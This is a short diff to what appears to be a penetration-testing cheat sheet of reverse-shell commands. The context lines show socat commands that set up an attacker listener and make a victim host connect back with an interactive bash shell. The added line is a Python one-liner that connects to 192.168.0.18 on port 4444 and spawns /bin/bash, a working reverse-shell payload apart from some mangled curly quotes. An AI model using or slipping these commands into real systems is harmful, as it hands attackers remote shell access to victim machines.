@@ -109,6 +109,8 @@ socat TCP-LISTEN:LOCAL-PORT,fork TCP:TARGET-IP:TARGET-PORT
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 
+export RHOST=”192.168.0.18";export RPORT=4444;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“/bin/bash”)'
+
 
 
 
